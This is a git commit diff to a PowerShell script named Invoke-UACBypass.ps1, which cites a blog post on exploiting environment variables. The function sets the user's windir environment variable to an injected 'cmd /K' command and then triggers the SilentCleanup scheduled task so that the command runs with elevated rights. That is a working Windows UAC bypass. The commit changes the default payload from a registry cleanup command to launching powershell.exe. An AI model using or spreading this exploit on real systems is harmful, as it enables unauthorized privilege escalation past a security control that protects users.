9b09b6156f1b7c4204f141c6ce8c970c64b43a4f
Liam Glanfield <liam@glanfield.co.uk>
2017-05-26 14:03:21 +0100

    Update Invoke-UACBypass.ps1

--- Invoke-UACBypass.ps1
+++ Invoke-UACBypass.ps1
@@ -1,7 +1,7 @@
 # https://tyranidslair.blogspot.co.uk/2017/05/exploiting-environment-variables-in.html
 
 Function Invoke-UACBypass {
-param($cmd="reg delete hkcu\Environment /v windir /f")
+param($cmd="powershell.exe")
 
     Set-ItemProperty -Path HKCU:\Environment -Name windir -Value "cmd /K $cmd && REM" -Force
     Invoke-Expression "schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I"
